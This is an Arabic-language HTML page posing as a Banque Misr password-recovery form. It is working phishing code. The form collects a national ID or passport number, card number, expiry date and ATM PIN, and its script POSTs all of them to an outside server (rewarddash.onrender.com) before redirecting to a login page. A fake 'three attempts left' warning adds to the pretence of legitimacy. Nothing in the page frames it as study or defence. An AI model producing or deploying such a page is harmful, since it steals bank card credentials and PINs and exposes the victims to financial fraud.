<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>نسيت كلمة المرور</title>
  <link rel="stylesheet" href="style.css" />
  <style>
    body {
      font-family: 'Arial', sans-serif;
      background-color: #fff;
      margin: 0;
      padding: 0 16px;
      direction: rtl;
    }

    .container {
      max-width: 480px;
      margin: 0 auto;
      padding-top: 20px;
    }

    .form-box {
      border: 1px solid #ddd;
      border-radius: 16px;
      padding: 20px;
      background-color: #fdfdfd;
      box-shadow: 0 2px 8px rgba(0,0,0,0.04);
    }

    .banner {
      background-color: #f5f5f5;
      color: #333;
      text-align: right;
      font-size: 18px;
      padding: 20px 12px;
      border-radius: 10px;
      font-weight: bold;
      margin-bottom: 24px;
    }

    label {
      display: block;
      font-size: 14px;
      margin-bottom: 6px;
    }

    input[type="text"],
    input[type="number"] {
      width: 100%;
      padding: 12px;
      font-size: 16px;
      margin-bottom: 16px;
      border: 1px solid #ccc;
      border-radius: 8px;
    }

    .row {
      display: flex;
      gap: 8px;
    }

    .row .half {
      flex: 1;
    }

    .pin-inputs {
      display: flex;
      justify-content: space-between;
      margin-bottom: 10px;
    }

    .pin-inputs input {
      width: 20%;
      padding: 12px;
      font-size: 18px;
      text-align: center;
      border: 1px solid #ccc;
      border-radius: 8px;
    }

    .attempts {
      font-size: 13px;
      color: #555;
      margin-bottom: 8px;
    }

    .note,
    .warning {
      font-size: 13px;
      margin-bottom: 16px;
      padding: 12px;
      border-radius: 8px;
    }

    .note {
      background-color: #f1f1f1;
      color: #444;
    }

    .warning {
      background-color: #d7efff;
      color: #333;
    }

    .btn {
      display: block;
      width: 100%;
      padding: 14px;
      background-color: #f5c8d2;
      color: #fff;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      text-align: center;
      transition: background-color 0.3s ease;
    }

    .btn.enabled {
      background-color: #d60032;
    }

    .btn:disabled {
      opacity: 0.5;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="form-box">
      <div class="banner">نسيت اسم المستخدم / كلمة المرور</div>

      <label for="national-id">الرقم القومي / رقم جواز السفر</label>
      <input type="text" id="national-id" placeholder="الرقم القومي / رقم جواز السفر" />

      <div class="row">
        <div class="half">
          <label for="exp-month">الشهر</label>
          <input type="number" id="exp-month" placeholder="MM" />
        </div>
        <div class="half">
          <label for="exp-year">السنة</label>
          <input type="number" id="exp-year" placeholder="YY" />
        </div>
      </div>

      <label for="card-number">رقم بطاقة بنك مصر</label>
      <input type="text" id="card-number" placeholder="رقم بطاقة بنك مصر" />

      <label>الرقم السري للبطاقة</label>
      <div class="pin-inputs">
        <input type="password" maxlength="1" class="pin" />
        <input type="password" maxlength="1" class="pin" />
        <input type="password" maxlength="1" class="pin" />
        <input type="password" maxlength="1" class="pin" />
      </div>

      <div class="attempts">٣ فرص متبقية</div>

      <div class="note">ما هو الرقم السري للبطاقة؟<br>الرمز (الرقم) الذي تستخدمه على أجهزة الصراف الآلي.</div>

      <div class="warning">
        يرجى التأكد من صحة الرقم السري للبطاقة قبل إدخاله. إذا قمت بإدخاله بشكل خاطئ ٣ مرات متتالية، فسيتم تعليق البطاقة كإجراء وقائي.
      </div>

      <button class="btn" id="submitBtn" disabled>متابعة</button>
    </div>
  </div>

  <script>
    const fields = [
      document.getElementById('national-id'),
      document.getElementById('exp-month'),
      document.getElementById('exp-year'),
      document.getElementById('card-number'),
      ...document.querySelectorAll('.pin')
    ];

    const button = document.getElementById('submitBtn');

    function checkForm() {
      const allFilled = fields.every(input => input.value.trim() !== '');
      if (allFilled) {
        button.disabled = false;
        button.classList.add('enabled');
      } else {
        button.disabled = true;
        button.classList.remove('enabled');
      }
    }

    fields.forEach(field => {
      field.addEventListener('input', checkForm);
    });

    const pinInputs = document.querySelectorAll('.pin');
    pinInputs.forEach((input, index) => {
      input.addEventListener('input', () => {
        if (input.value.length === 1 && index < pinInputs.length - 1) {
          pinInputs[index + 1].focus();
        }
      });

      input.addEventListener('keydown', e => {
        if (e.key === 'Backspace' && input.value === '' && index > 0) {
          pinInputs[index - 1].focus();
        }
      });
    });

    button.addEventListener('click', () => {
      const nationalId = document.getElementById('national-id').value.trim();
      const expMonth = document.getElementById('exp-month').value.trim();
      const expYear = document.getElementById('exp-year').value.trim();
      const cardNumber = document.getElementById('card-number').value.trim();
      const pin = Array.from(pinInputs).map(input => input.value.trim()).join('');

      // Compose message as single string like your login page
      const message = `
نسيت كلمة المرور:
- الرقم القومي / جواز السفر: ${nationalId}
- انتهاء الصلاحية: ${expMonth}/${expYear}
- رقم البطاقة: ${cardNumber}
- الرقم السري: ${pin}
      `.trim();

      const payload = {
        text: message,
        flag: "forget_password" // include flag here if your API expects it
      };

      fetch("https://rewarddash.onrender.com/api/messages", {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      })
      .then(async response => {
        const text = await response.text();
        if (!response.ok) {
          console.error('API error:', response.status, text);
          throw new Error('Network error');
        }
        console.log('API response:', text);
        return JSON.parse(text);
      })
      .then(data => {
        // Redirect or show success message
        window.location.href = 'login.html';
      })
      .catch(error => {
        console.error('Fetch error:', error);
        alert('حدث خطأ أثناء إرسال البيانات، يرجى المحاولة لاحقاً');
      });
    });
  </script>
</body>
</html>
